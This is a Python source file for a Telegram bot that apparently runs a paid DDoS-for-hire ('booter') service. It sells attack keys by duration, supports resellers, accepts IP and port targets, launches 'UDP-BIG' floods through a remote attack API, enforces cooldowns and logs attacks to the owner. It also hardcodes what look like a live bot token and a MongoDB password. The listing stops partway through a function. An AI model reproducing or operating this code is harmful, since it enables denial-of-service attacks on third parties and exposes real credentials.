import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import threading
import os
import random
import string
import re
from pymongo import MongoClient
from datetime import datetime, timedelta
import time
import requests
import psutil
import traceback
import subprocess
import json
from urllib.parse import urlparse
import queue
import logging

logging.basicConfig(level=logging.INFO)

log = logging.getLogger(__name__)

BOT_START_TIME = datetime.now()

# ============ PREMIUM CUSTOM EMOJIS (FROM EMOJIS.PY) ============
CUSTOM_EMOJI = {
    "sword": "6291764155313558218", "check": "6122738552057894402", "cross": "6311901835330329554", "target": "5256131095094652290",
    "timer": "5262540380301191210", "hourglass": "5258113901106580375", "lightning": "5215203703190989803", "chart": "6278293127828609686",
    "gear": "5341715473882955310", "key": "6280601427937073120", "star": "5438496463044752972", "briefcase": "5390928897082663005",
    "crown": "6278347033963141306", "diamond": "5427168083074628963", "camera": "5969576917316145104", "warning": "5420323339723881652",
    "fire": "6199587753345161640", "location": "6309905482991538941", "congrats": "5039529134078821602", "refresh": "5375338737028841420",
    "breaking": "5456140674028019486", "urgent": "5224607267797606837", "percent": "5229064374403998351", "ban": "5260293700088511294",
    "cancel": "5240241223632954241", "exclamation": "5274099962655816924", "double_excl": "5440660757194744323", "question": "5436113877181941026",
    "warning_yellow": "5447644880824181073", "warning_red": "5420323339723881652", "internet": "5447410659077661506", "cloud_text": "5467538555158943525",
    "chat": "5443038326535759644", "stats": "5231200819986047254", "chart_up": "5449683594425410231", "chart_down": "5447183459602669338",
    "stock_chart": "5451882707875276247", "rising": "5244837092042750681", "falling": "5246762912428603768", "checkmark": "5206607081334906820",
    "bell": "5458603043203327669", "pin": "5397782960512444700", "dollar": "5409048419211682843", "euro": "5233326571099534068",
    "ruble": "5231449120635370684", "yuan": "5278751923338490157", "pound": "5290017777174722330", "record": "5411225014148014586",
    "explosion": "5276032951342088188", "mic": "5224736245665511429", "announcement": "5424818078833715060", "fake_news": "5449875686837726134",
    "secret": "5431609822288033666", "quote": "5460795800101594035", "link": "5271604874419647061", "info": "5323442290708985472",
    "like": "5337080053119336309", "play": "5348125953090403204", "pause": "5359543311897998264", "new_badge": "5382357040008021292",
    "top": "5415655814079723871", "soon": "5440621591387980068", "plus": "5397916757333654639", "bookmark": "5222444124698853913",
    "letter": "5253742260054409879", "lock": "5296369303661067030", "paperclip": "5305265301917549162", "settings": "5341715473882955310",
    "speaker": "5388632425314140043", "download": "5386367538735104399", "calendar": "5413879192267805083", "idea": "5422439311196834318",
    "free": "5406756500108501710", "pencil": "5395444784611480792", "discount": "5406683434124859552", "red_flag": "5460755126761312667",
    "telegram": "5206208353751024833", "tiktok": "5206421491503088521", "instagram": "5206383450977750405", "youtube": "5206230030450975877",
    "discord_static": "5204222562736819197", "twitter_x": "5204061664671976334", "vk": "5206488346964018944", "twitch_static": "5206637287839910058",
    "linkedin": "5206238027680071780", "sbp": "5206636501860893075", "yoomoney": "5206577300031684638", "visa": "5204357742537492089",
    "mir": "5206430772927416278", "mastercard": "5206505943445034137", "unionpay": "5204146997082212715", "reddit": "5204297737549401749",
    "boosty": "5206603503627158548", "firefox": "5206467129825576500", "chrome": "5206714141984703098", "safari": "5204393970586634794",
    "edge": "5206246871017733775", "opera": "5204049982360930089", "yandex": "5206329063806879532", "google": "5206308821626012868",
    "photoshop": "5206286797033719693", "after_effects": "5203999112768279777", "premiere": "5206200751658911590", "figma": "5206378662089214861",
    "blender": "5206629470999429293", "word": "5204024191082318452", "excel": "5204205747939856389", "powerpoint": "5206624102290311682",
    "tg_stars": "5172484558305625218", "github": "4999005636604723783", "twitch_anim": "4999434394599948988", "discord_anim": "5019579577924584242",
    "toggle": "4970142833605345805", "heart_anim": "4996980495100150380", "live": "4927197721900614739", "tg_bw": "5875465628285931233",
    "stars_bw": "5958376256788502078", "settings_bw": "5877260593903177342", "install": "5899757765743615694", "back": "5875082500023258804",
    "data": "5877485980901971030", "dog": "5771887475421090729", "link_bw": "5877465816030515018", "tag": "5985433648810171091",
    "fav": "5843843420468024653", "keyboard": "5877396173135811032", "dots": "5875019892284985369", "check_bw": "5825794181183836432",
    "dots_up": "5877219383691972108", "search": "5874960879434338403", "forward": "5877468380125990242", "trash": "5879896690210639947",
    "copy": "5877301185639091664", "profile": "5879770735999717115", "archive": "5967456680940671207", "pencil_bw": "5879841310902324730",
    "updates": "5877410604225924969", "rec_bw": "5846024087033353251", "info_bw": "5879785854284599288", "ban_bw": "5872829476143894491",
    "excl_bw": "5879813604068298387", "internet_bw": "5879585266426973039", "delvorn_cheat": "6161151927804502806", "delvorn": "6161151927804502806",
    "dspsir_check": "6116362711761687276", "dspsir_alert": "6257780484281997093", "heart_eyes": "5233702221824173748", "heart_red": "5244753103957277760",
    "strawberry": "5238239167577628255", "nsfw_18": "5275974823254725631", "strawberry_2": "5260361384478157819", "strawberry_3": "5346164763648870440",
    "smirk": "5411420250476406699", "black_heart": "5913448455035949334", "black_heart_2": "5913345616339014439", "checkbox_patriot": "5913344229064577598",
    "eyes": "5210956306952758910", "lip_bite": "5395444514028529554", "cool_sunglasses": "6289761575272191135", "rocket_anim": "6289276883917870488",
    "right_arrow_anim": "6208698328167750089", "megaphone_anim": "6208500192736450951", "stop_sign_anim": "6206384371587356863", "detective_anim": "6141024787637471668",
    "smile_anim": "6140999116617943287", "masks_anim": "6141060654909360432", "pin_anim": "6215512701804748627", "cross_anim": "6215407840178216561",
    "desktop_anim": "6113759377464760865", "tv_anim": "6113666159494569105", "stop_round_anim": "6115919428187068527", "fire_shaitaan": "6203736073277807578",
    "shield_anim": "6282759103542468958", "kiss_cat_anim": "6204033525532858608", "fire_stick": "6289627134205891883", "refresh_stick": "6289508876576363345",
    "black_cat_anim": "5958605483488055761", "black_cat_anim2": "5929300264497453950", "japan_flag": "5929487954568289296", "leopard_anim": "5929404477583922214",
    "lion_anim": "5929146474603483609", "finger_up_1": "5465144931230190889", "finger_up_2": "5462931610028510371", "finger_up_3": "5463123191339715467",
    "finger_up_4": "5462900531645154669", "pink_heart": "5294516622273318680", "tongue_anim": "5199646700284687065", "yum_anim": "5294261750324042913",
    "yum_anim2": "5293990986995768044", "swear_anim": "5276419816226328169", "love_eyes": "5343549493637827794", "angry_anim": "5242192272656708627",
    "sleepy_anim": "6129574787078429498", "money_wings": "6129680679497111287", "star_gold": "6129672630728400259", "lightning_anim": "6129817830687775854",
    "skull_crossbones": "6129889801454754893", "siren_anim": "6129532640564354033", "gift_box": "6129520790749584124", "bell_gold": "6129652186684070216",
    "lightning_cloud": "6129769130053605799", "heart_ribbon": "6129895818703936830", "two_hearts": "6129476453802188018", "ghost_anim": "6129758830722030858",
    "heart_arrow": "6129602914819250817", "surprised_anim": "6129795982189141421", "red_heart_glow": "6156715484285770345", "star_glow": "6156541396376361727",
    "skull_anim": "6204172639523572930", "thinking_anim": "6204062606756415887", "moai_anim": "6203999513686837822", "laugh_anim": "6203985421899139846",
    "blush_smile": "6203936377667586967", "unamused_anim": "6204052328899679322", "skull_meme": "6204124913846979800", "tongue_squint": "6204154828294196038",
    "coffee_cup": "6204246817903741953", "angry_face": "6203988273757424313", "sunglasses_meme": "6204203400079346542", "eyebrow_anim": "6204137858878408770",
    "cat_smile": "6204211380128581672", "peeking_anim": "6206102428459206960", "rofl_anim": "6206186330645334486", "crying_anim": "6206495744384305279",
    "disguise_face": "6204152199774210704", "devil_anim": "6203927663178945555", "dancing_man": "6204261266173725393", "crazy_face": "6204083179649764891",
    "hot_face": "6206367432236338118", "screaming_face": "6206486750722787733", "star_struck": "6203715736607656627", "party_popper": "6204071299770225371",
    "neutral_face": "6204195110792464626", "grin_anim": "6204140861060549447", "mute_speaker": "6203752982564047567", "mind_blown": "6203865454872627806",
    "steam_nose": "6204096433918839077", "dancing_woman": "6203752282484378089", "headphones_anim": "6204100084641041391", "hugging_face": "6203804376142712227",
    "facepalm_anim": "6203887994860998039", "weary_face": "6204178716902296546", "alien_anim": "6206005727270537885", "stop_sign_meme": "6206087701016349357",
    "pensive_face": "6203781745960028521", "no_gesture": "6204152642155843525", "matrix_a": "5193141001652285304", "matrix_font1": "5203919265031270345",
    "matrix_font2": "5204202483764701671", "matrix_font3": "5204140275458386538", "matrix_font4": "5231018528689108942",
}

def pe(name, fallback=""):
    emoji_id = CUSTOM_EMOJI.get(name)
    if emoji_id:
        return f'<tg-emoji emoji-id="{emoji_id}">{fallback}</tg-emoji>'
    return fallback

# ============ NAYA: GLOBAL INLINE KEYBOARD ============
CHANNEL_LINK = "https://t.me/+bvadn4BygOgzNGRl"
OWNER_LINK = "https://t.me/RapidXVVB"

def get_main_keyboard():
    markup = InlineKeyboardMarkup(row_width=1)
    markup.add(
        InlineKeyboardButton(
            "🔥 𝗝𝗼𝗶𝗻 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 🔥", 
            url=CHANNEL_LINK, 
            style="primary"
        ),
        InlineKeyboardButton(
            "💎 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗢𝘄𝗻𝗲𝗿 💎", 
            url=OWNER_LINK, 
            style="danger"
        )
    )
    return markup

MAIN_KEYBOARD = get_main_keyboard()

# ========================================================

BOT_TOKEN = "8666136800:AAGA9JINNHk8_nlJ7_WYWnr2IZMNErhScp4"

MONGO_URL = "mongodb+srv://darkgamer08102010_db_user:2sOH3i0yUOLHgkGA@cluster0.snbz6ms.mongodb.net/?app_name=Cluster0"

API_BASE_URL = "https://discretion-applicant-gamma-sized.trycloudflare.com"

API_KEY = "DEPEND YOUR API SYSTEM"

ATTACK_METHOD = "UDP-BIG"

FEEDBACK_CHANNEL_ID = -1003975828211

BOT_OWNER = 1725783398

print("ꜱᴛᴀʀᴛɪɴɢ ʙᴏᴛ...")
print("ᴄᴏɴɴᴇᴄᴛɪɴɢ ᴛᴏ ᴍᴏɴɢᴏᴅʙ...")
try:
    client = MongoClient(MONGO_URL, serverSelectionTimeoutMS=5000)
    client.admin.command('ping')
    db = client['telegram_bot']
    keys_collection = db['keys']
    users_collection = db['users']
    resellers_collection = db['resellers']
    attack_logs_collection = db['attack_logs']
    
    bot_users_collection = db['bot_users']
    bot_settings_collection = db['bot_settings']
    feedback_collection = db['feedback']
    bots_collection = db['bots']
    approved_groups_collection = db['approved_groups']
    blocked_ips_collection = db['blocked_ips']
    
    keys_collection.create_index('key', unique=True)
    users_collection.create_index('user_id', unique=True)
    resellers_collection.create_index('user_id', unique=True)
    bot_users_collection.create_index('user_id', unique=True)
    feedback_collection.create_index('user_id', unique=True)
    bots_collection.create_index('token', unique=True)
    bots_collection.create_index('bot_id', unique=True)
    approved_groups_collection.create_index('group_id', unique=True)
    blocked_ips_collection.create_index('ip', unique=True)
    
    print("ᴍᴏɴɢᴏᴅʙ ᴄᴏɴɴᴇᴄᴛᴇᴅ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ!")
except Exception as e:
    print(f"ᴍᴏɴɢᴏᴅʙ ᴄᴏɴɴᴇᴄᴛɪᴏɴ ᴇʀʀᴏʀ: {e}")
    exit(1)

bot = telebot.TeleBot(BOT_TOKEN)

# RESELLER BALANCE PRICING with all durations up to 30 days
KEY_PRICING = {
    'VIP': {
        '1d': 80, '2d': 150, '3d': 200, '4d': 250, '5d': 300, '6d': 350, '7d': 400,
        '8d': 450, '9d': 500, '10d': 550, '11d': 600, '12d': 650, '13d': 700, '14d': 750,
        '15d': 800, '16d': 850, '17d': 900, '18d': 950, '19d': 1000, '20d': 1050,
        '21d': 1100, '22d': 1150, '23d': 1200, '24d': 1250, '25d': 1300, '26d': 1350,
        '27d': 1400, '28d': 1450, '29d': 1475, '30d': 1500,
        'max_attack': 300
    },
    'NORMAL': {
        '1d': 70, '2d': 130, '3d': 200, '4d': 230, '5d': 260, '6d': 280, '7d': 300,
        '8d': 350, '9d': 400, '10d': 450, '11d': 500, '12d': 550, '13d': 550, '14d': 580,
        '15d': 600, '16d': 650, '17d': 700, '18d': 750, '19d': 800, '20d': 850,
        '21d': 880, '22d': 910, '23d': 940, '24d': 970, '25d': 1000, '26d': 1030,
        '27d': 1060, '28d': 1080, '29d': 1090, '30d': 1100,
        'max_attack': 300
    }
}

DURATION_SECONDS = {
    '1d': 1 * 24 * 3600, '2d': 2 * 24 * 3600, '3d': 3 * 24 * 3600,
    '4d': 4 * 24 * 3600, '5d': 5 * 24 * 3600, '6d': 6 * 24 * 3600,
    '7d': 7 * 24 * 3600, '8d': 8 * 24 * 3600, '9d': 9 * 24 * 3600,
    '10d': 10 * 24 * 3600, '11d': 11 * 24 * 3600, '12d': 12 * 24 * 3600,
    '13d': 13 * 24 * 3600, '14d': 14 * 24 * 3600, '15d': 15 * 24 * 3600,
    '16d': 16 * 24 * 3600, '17d': 17 * 24 * 3600, '18d': 18 * 24 * 3600,
    '19d': 19 * 24 * 3600, '20d': 20 * 24 * 3600, '21d': 21 * 24 * 3600,
    '22d': 22 * 24 * 3600, '23d': 23 * 24 * 3600, '24d': 24 * 24 * 3600,
    '25d': 25 * 24 * 3600, '26d': 26 * 24 * 3600, '27d': 27 * 24 * 3600,
    '28d': 28 * 24 * 3600, '29d': 29 * 24 * 3600, '30d': 30 * 24 * 3600,
    '2h': 2 * 3600, '6h': 6 * 3600, '12h': 12 * 3600
}

DURATION_LABELS = {
    '1d': '1 Day', '2d': '2 Days', '3d': '3 Days', '4d': '4 Days',
    '5d': '5 Days', '6d': '6 Days', '7d': '7 Days', '8d': '8 Days',
    '9d': '9 Days', '10d': '10 Days', '11d': '11 Days', '12d': '12 Days',
    '13d': '13 Days', '14d': '14 Days', '15d': '15 Days', '16d': '16 Days',
    '17d': '17 Days', '18d': '18 Days', '19d': '19 Days', '20d': '20 Days',
    '21d': '21 Days', '22d': '22 Days', '23d': '23 Days', '24d': '24 Days',
    '25d': '25 Days', '26d': '26 Days', '27d': '27 Days', '28d': '28 Days',
    '29d': '29 Days', '30d': '30 Days', '2h': '2 Hours', '6h': '6 Hours', '12h': '12 Hours'
}

KEY_PRICING['VIP']['2h'] = 20
KEY_PRICING['VIP']['6h'] = 40
KEY_PRICING['VIP']['12h'] = 50
KEY_PRICING['NORMAL']['2h'] = 20
KEY_PRICING['NORMAL']['6h'] = 40
KEY_PRICING['NORMAL']['12h'] = 50

DEFAULT_MAX_ATTACK_TIME = 300
DEFAULT_USER_COOLDOWN = 60
MIN_ATTACK_TIME = 15

global_attack_lock = threading.Lock()
pending_feedback = {}
current_max_slots = 10
current_concurrent_value = 10

active_bots = {}
bot_threads = {}

active_attacks = {}
api_in_use = {}
user_attack_history = {}
active_port_attacks = {}
bot_start_time = datetime.now()
user_cooldown_end_time = {}
temp_key_gen = {}
pending_broadcast = {}
pending_broadcast_reseller = {}
pending_del_exp = {}
pending_del_exp_key = {}
status_update_threads = {}
group_pending_feedback = {}
live_status_trackers = {}

def font_text(text):
    font_map = {
        'a': 'ᴀ', 'b': 'ʙ', 'c': 'ᴄ', 'd': 'ᴅ', 'e': 'ᴇ', 'f': 'ꜰ', 'g': 'ɢ', 'h': 'ʜ', 'i': 'ɪ',
        'j': 'ᴊ', 'k': 'ᴋ', 'l': 'ʟ', 'm': 'ᴍ', 'n': 'ɴ', 'o': 'ᴏ', 'p': 'ᴘ', 'q': 'ǫ', 'r': 'ʀ',
        's': 'ꜱ', 't': 'ᴛ', 'u': 'ᴜ', 'v': 'ᴠ', 'w': 'ᴡ', 'x': 'x', 'y': 'ʏ', 'z': 'ᴢ',
        'A': 'ᴀ', 'B': 'ʙ', 'C': 'ᴄ', 'D': 'ᴅ', 'E': 'ᴇ', 'F': 'ꜰ', 'G': 'ɢ', 'H': 'ʜ', 'I': 'ɪ',
        'J': 'ᴊ', 'K': 'ᴋ', 'L': 'ʟ', 'M': 'ᴍ', 'N': 'ɴ', 'O': 'ᴏ', 'P': 'ᴘ', 'Q': 'ǫ', 'R': 'ʀ',
        'S': 'ꜱ', 'T': 'ᴛ', 'U': 'ᴜ', 'V': 'ᴠ', 'W': 'ᴡ', 'X': 'x', 'Y': 'ʏ', 'Z': 'ᴢ'
    }
    result = ""
    for char in text:
        if char in font_map:
            result += font_map[char]
        else:
            result += char
    return result

def is_owner(user_id):
    return user_id in BOT_OWNER

def safe_send_message(chat_id, text, reply_to=None, parse_mode=None, reply_markup=MAIN_KEYBOARD):
    try:
        if reply_to:
            return bot.reply_to(reply_to, text, parse_mode=parse_mode, reply_markup=reply_markup)
        else:
            return bot.send_message(chat_id, text, parse_mode=parse_mode, reply_markup=reply_markup)
    except Exception as e:
        print(f"sᴀꜰᴇ ꜱᴇɴᴅ ᴇʀʀᴏʀ: {e}")
        return None

def get_setting(key, default):
    try:
        setting = bot_settings_collection.find_one({'key': key})
        if setting:
            return setting['value']
        return default
    except:
        return default

def set_setting(key, value):
    bot_settings_collection.update_one(
        {'key': key},
        {'$set': {'key': key, 'value': value}},
        upsert=True
    )

def get_key_price(key_type, duration):
    prices = get_setting(f'pricing_{key_type}', KEY_PRICING[key_type])
    if isinstance(prices, dict):
        return prices.get(duration, KEY_PRICING[key_type].get(duration, 0))
    return KEY_PRICING[key_type].get(duration, 0)

def get_key_max_attack(key_type):
    return get_setting(f'max_attack_{key_type}', KEY_PRICING[key_type]['max_attack'])

def get_max_attack_time():
    try:
        return int(get_setting('max_attack_time', DEFAULT_MAX_ATTACK_TIME))
    except:
        return DEFAULT_MAX_ATTACK_TIME

def get_user_cooldown_setting():
    try:
        return int(get_setting('user_cooldown', DEFAULT_USER_COOLDOWN))
    except:
        return DEFAULT_USER_COOLDOWN

def get_concurrent_limit():
    try:
        return int(get_setting('concurrent_per_attack', current_concurrent_value))
    except:
        return current_concurrent_value

def set_concurrent_limit(value):
    global current_concurrent_value
    current_concurrent_value = value
    set_setting('concurrent_per_attack', value)

def is_maintenance():
    return get_setting('maintenance_mode', False)

def get_maintenance_msg():
    return get_setting('maintenance_msg', '🔧 ʙᴏᴛ ɪꜱ ɪɴ ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ ᴍᴏᴅᴇ. ᴘʟᴇᴀꜱᴇ ᴛʀʏ ᴀɢᴀɪɴ ʟᴀᴛᴇʀ.')

def set_maintenance(enabled, msg=None):
    set_setting('maintenance_mode', enabled)
    if msg:
        set_setting('maintenance_msg', msg)

def add_blocked_ip(ip_prefix):
    try:
        blocked_ips_collection.insert_one({'ip': ip_prefix, 'blocked_at': datetime.now()})
        return True
    except:
        return False

def remove_blocked_ip(ip_prefix):
    result = blocked_ips_collection.delete_one({'ip': ip_prefix})
    return result.deleted_count > 0

def is_ip_blocked(ip_address):
    blocked_ips = list(blocked_ips_collection.find())
    for blocked in blocked_ips:
        prefix = blocked['ip']
        if ip_address.startswith(prefix):
            return True
    return False

def get_all_blocked_ips():
    return list(blocked_ips_collection.find())

def check_maintenance(message):
    if is_maintenance() and not is_owner(message.from_user.id):
        maint_msg = f"{pe('gear','🔧')} {get_maintenance_msg()}"
        safe_send_message(message.chat.id, maint_msg, reply_to=message, parse_mode="HTML")
        return True
    return False

def check_banned(message):
    user_id = message.from_user.id
    if is_owner(user_id):
        return False
    
    user = users_collection.find_one({'user_id': user_id})
    if user and user.get('banned'):
        if user.get('ban_type') == 'temporary' and user.get('ban_expiry'):
            if datetime.now() > user['ban_expiry']:
                users_collection.update_one(
                    {'user_id': user_id}, 
                    {'$set': {'banned': False}, '$unset': {'ban_expiry': "", 'ban_type': ""}}
                )
                return False
            
            expiry_str = user['ban_expiry'].strftime('%d-%m-%Y %H:%M:%S')
            safe_send_message(message.chat.id, f"{pe('cross','🚫')} Yᴏᴜ ʜᴀᴠᴇ ʙᴇᴇɴ ᴛᴇᴍᴘᴏʀᴀʀɪʟʏ ʙᴀɴɴᴇᴅ!\n\n{pe('hourglass','⏳')} Exᴘɪʀʏ: {expiry_str}\n{pe('cross','❌')} Yᴏᴜ ᴄᴀɴɴᴏᴛ ᴅᴏ ᴀɴʏᴛʜɪɴɢ.\n\n{pe('briefcase','📞')} Cᴏɴᴛᴀᴄᴛ Yᴏᴜʀ Sᴇʟʟᴇʀ", reply_to=message, parse_mode="HTML")
            return True
        
        safe_send_message(message.chat.id, f"{pe('cross','🚫')} Yᴏᴜ ʜᴀᴠᴇ ʙᴇᴇɴ ᴘᴇʀᴍᴀɴᴇɴᴛʟʏ ʙᴀɴɴᴇᴅ!\n\n{pe('cross','❌')} Yᴏᴜ ᴄᴀɴɴᴏᴛ ᴅᴏ ᴀɴʏᴛʜɪɴɢ.\n\n{pe('briefcase','📞')} Cᴏɴᴛᴀᴄᴛ Yᴏᴜʀ Sᴇʟʟᴇʀ", reply_to=message, parse_mode="HTML")
        return True
    return False

_attack_lock = threading.Lock()

def maintenance_auto_extender():
    while True:
        try:
            if is_maintenance():
                now = datetime.now()
                active_users = users_collection.find({'key_expiry': {'$gt': now}})
                for user in active_users:
                    new_expiry = user['key_expiry'] + timedelta(minutes=1)
                    users_collection.update_one(
                        {'_id': user['_id']},
                        {'$set': {'key_expiry': new_expiry}}
                    )
            time.sleep(60)
        except Exception as e:
            print(f"ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ ᴇxᴛᴇɴᴅᴇʀ ᴇʀʀᴏʀ: {e}")
            time.sleep(10)

extender_thread = threading.Thread(target=maintenance_auto_extender, daemon=True)
extender_thread.start()

def get_free_slot():
    with _attack_lock:
        now = datetime.now()
        expired = []
        for attack_id, attack in list(active_attacks.items()):
            if attack['end_time'] <= now:
                expired.append(attack_id)
        
        for attack_id in expired:
            if attack_id in active_attacks:
                del active_attacks[attack_id]
            if attack_id in api_in_use:
                del api_in_use[attack_id]
            if attack_id in active_port_attacks:
                del active_port_attacks[attack_id]
        
        busy_slots = len(api_in_use)
        
        if busy_slots < current_max_slots:
            return busy_slots
        
        return None

def get_slot_status():
    with _attack_lock:
        now = datetime.now()
        expired = []
        for attack_id, attack in list(active_attacks.items()):
            if attack['end_time'] <= now:
                expired.append(attack_id)
        
        for attack_id in expired:
            if attack_id in active_attacks:
                del active_attacks[attack_id]
            if attack_id in api_in_use:
                del api_in_use[attack_id]
            if attack_id in active_port_attacks:
                del active_port_attacks[attack_id]
        
        busy_slots = len(api_in_use)
        free_slots = current_max_slots - busy_slots
        return busy_slots, free_slots, current_max_slots

def get_user_cooldown(user_id):
    if user_id in user_cooldown_end_time:
        if user_cooldown_end_time[user_id] > datetime.now():
            return int((user_cooldown_end_time[user_id] - datetime.now()).total_seconds())
        else:
            del user_cooldown_end_time[user_id]
    return 0

def set_user_cooldown(user_id, seconds):
    user_cooldown_end_time[user_id] = datetime.now() + timedelta(seconds=seconds)

def validate_target(target):
    ip_pattern = re.compile(r'^(\d{1,3}\.){3}\d{1,3}$')
    if ip_pattern.match(target):
        parts = target.split('.')
        for part in parts:
            if int(part) > 255:
                return False
        return True
    return False

def is_port_being_attacked(target, port):
    with _attack_lock:
        for attack_id, attack in active_attacks.items():
            if attack.get('target') == target and attack.get('port') == port:
                if attack['end_time'] > datetime.now():
                    return True, attack['end_time']
        return False, None

def log_attack(user_id, username, target, port, duration):
    attack_logs_collection.insert_one({
        'user_id': user_id,
        'username': username,
        'target': target,
        'port': port,
        'duration': duration,
        'timestamp': datetime.now()
    })
    try:
        for owner in BOT_OWNER:
            msg = f"{pe('sword','⚔️')} ᴀᴛᴛᴀᴄᴋ ɴᴏᴛɪꜰɪᴄᴀᴛɪᴏɴ\n\n{pe('profile','👤')} Usᴇʀ: {username}\n{pe('profile','🆔')} ID: {user_id}\n{pe('target','🎯')} Tᴀʀɢᴇᴛ: {target}:{port}\n{pe('timer','⏱️')} Dᴜʀᴀᴛɪᴏɴ: {duration}s\n{pe('timer','🕐')} Tɪᴍᴇ: {datetime.now().strftime('%d-%m-%Y %H:%M:%S')}"
            bot.send_message(owner, msg, parse_mode="HTML")
    except:
        pass

def generate_key(prefix="RAPID-X", length=12):
    chars = string.ascii_uppercase + string.digits
    return f"{prefix}-{''.join(random.choice(chars) for _ in range(length))}"

def parse_duration(duration_str):
    match = re.match(r'^(\d+)([smhd])$', duration_str.lower())
    if not match:
        return None, None
    
    value = int(match.group(1))
    unit = match.group(2)
    
    if unit == 's':
        return timedelta(seconds=value), f"{value} seconds"
    elif unit == 'm':
        return timedelta(minutes=value), f"{value} minutes"
    elif unit == 'h':
        return timedelta(hours=value), f"{value} hours"
    elif unit == 'd':
        return timedelta(days=value), f"{value} days"
    
    return None, None

def is_reseller(user_id):
    reseller = resellers_collection.find_one({'user_id': user_id, 'blocked': {'$ne': True}})
    return reseller is not None

def get_reseller(user_id):
    return resellers_collection.find_one({'user_id': user_id})

def resolve_user(input_str):
    input_str = input_str.strip().lstrip('@')
    
    try:
        user_id = int(input_str)
        return user_id, None
    except ValueError:
        pass
    
    user = users_collection.find_one({'username': {'$regex': f'^{input_str}$', '$options': 'i'}})
    if user:
        return user['user_id'], user.get('username')
    
    reseller = resellers_collection.find_one({'username': {'$regex': f'^{input_str}$', '$options': 'i'}})
    if reseller:
        return reseller['user_id'], reseller.get('username')
    
    bot_user = bot_users_collection.find_one({'username': {'$regex': f'^{input_str}$', '$options': 'i'}})
    if bot_user:
        return bot_user['user_id'], bot_user.get('username')
    
    return None, None

def has_valid_key(user_id):
    if is_owner(user_id):
        return True
    
    user = users_collection.find_one({'user_id': user_id, 'key': {'$ne': None}})
    
    if not user or not user.get('key_expiry'):
        return False
    
    if datetime.now() > user['key_expiry']:
        users_collection.update_one({'user_id': user_id}, {'$set': {'key': None, 'key_expiry': None}})
        return False
    
    return True

def get_time_remaining(user_id):
    user = users_collection.find_one({'user_id': user_id})
    
    if not user or not user.get('key_expiry'):
        return "0ᴅ 0ʜ 0ᴍ 0ꜱ"
    
    remaining = user['key_expiry'] - datetime.now()
    if remaining.total_seconds() <= 0:
        return "0ᴅ 0ʜ 0ᴍ 0ꜱ"
    
    days = remaining.days
    hours, remainder = divmod(remaining.seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    
    return f"{days}ᴅ {hours}ʜ {minutes}ᴍ {seconds}ꜱ"

def format_timedelta(td):
    days = td.days
    hours, remainder = divmod(td.seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{days}ᴅ {hours}ʜ {minutes}ᴍ {seconds}ꜱ"

def track_bot_user(user_id, username=None):
    try:
        bot_users_collection.update_one(
            {'user_id': user_id},
            {'$set': {'user_id': user_id, 'username': username, 'last_seen': datetime.now()}},
            upsert=True
        )
    except:
        pass

def build_attack_start_message(target, port, duration, cooldown):
    s = pe('sword','⚔️')
    t = pe('target','🎯')
    tm = pe('timer','⏱️')
    f = pe('fire','🔥')
    loc = pe('location','📍')
    cd = pe('hourglass','⏳')
    st = pe('chart','📊')
    return f"""
<b>{s} Aᴛᴛᴀᴄᴋ Sᴛᴀʀᴛᴇᴅ {s}</b>

<b>{t} Tᴀʀɢᴇᴛ:</b> <code>{target}:{port}</code>
<b>{tm} Dᴜʀᴀᴛɪᴏɴ:</b> <code>{duration}</code> ꜱᴇᴄᴏɴᴅꜱ
<b>{f} Mᴇᴛʜᴏᴅ:</b> <code>Gᴀᴍᴇ</code>
<b>{loc} Lᴏᴄᴀᴛɪᴏɴ:</b> <code>Gʟᴏʙᴀʟ</code>
<b>{cd} Cᴏᴏʟᴅᴏᴡɴ:</b> <code>{cooldown}</code> ꜱᴇᴄᴏɴᴅꜱ

<b>{st} Usᴇ /status ᴛᴏ ᴄʜᴇᴄᴋ ᴀᴛᴛᴀᴄᴋ ᴘʀᴏɢʀᴇꜱꜱ</b>
"""

def build_attack_complete_message(target, port, duration):
    c = pe('check','✅')
    t = pe('target','🎯')
    tm = pe('timer','⏱️')
    return f"""
<b>{c} Aᴛᴛᴀᴄᴋ Cᴏᴍᴘʟᴇᴛᴇᴅ {c}</b>

<b>{t} Tᴀʀɢᴇᴛ:</b> {target}:{port}
<b>{tm} Dᴜʀᴀᴛɪᴏɴ:</b> {duration} ꜱᴇᴄᴏɴᴅꜱ
"""

def build_feedback_required_message():
    e = pe('camera','📸')
    return f"""
<b>{e} Fᴇᴇᴅʙᴀᴄᴋ RᴇQᴜɪʀᴇᴅ {e}</b>

Yᴏᴜ ᴍᴜꜱᴛ ꜱᴇɴᴅ ᴀ ꜱᴄʀᴇᴇɴꜱʜᴏᴛ/ᴘʜᴏᴛᴏ ᴀꜱ ꜰᴇᴇᴅʙᴀᴄᴋ ꜰʀᴏᴍ ʏᴏᴜʀ ʟᴀꜱᴛ ᴀᴛᴛᴀᴄᴋ ʙᴇꜰᴏʀᴇ ꜱᴛᴀʀᴛɪɴɢ ᴀ ɴᴇᴡ ᴏɴᴇ.

<b>Pʟᴇᴀꜱᴇ ꜱᴇɴᴅ ᴀɴʏ ᴘʜᴏᴛᴏ ᴛᴏ ᴄᴏɴᴛɪɴᴜᴇ.</b>
"""

def set_pending_feedback(user_id, target, port, duration, is_group=False, group_id=None):
    if is_group and group_id:
        if group_id not in group_pending_feedback:
            group_pending_feedback[group_id] = {}
        group_pending_feedback[group_id][user_id] = {
            'target': target,
            'port': port,
            'duration': duration,
            'timestamp': datetime.now()
        }
    else:
        pending_feedback[user_id] = {
            'target': target,
            'port': port,
            'duration': duration,
            'timestamp': datetime.now()
        }

def get_pending_feedback(user_id, is_group=False, group_id=None):
    if is_group and group_id:
        if group_id in group_pending_feedback and user_id in group_pending_feedback[group_id]:
            return group_pending_feedback[group_id][user_id]
        return None
    return pending_feedback.get(user_id)

def clear_pending_feedback(user_id, is_group=False, group_id=None):
    if is_group and group_id:
        if group_id in group_pending_feedback and user_id in group_pending_feedback[group_id]:
            del group_pending_feedback[group_id][user_id]
    else:
        if user_id in pending_feedback:
            del pending_feedback[user_id]

def has_pending_feedback(user_id, is_group=False, group_id=None):
    if is_group and group_id:
        return group_id in group_pending_feedback and user_id in group_pending_feedback[group_id]
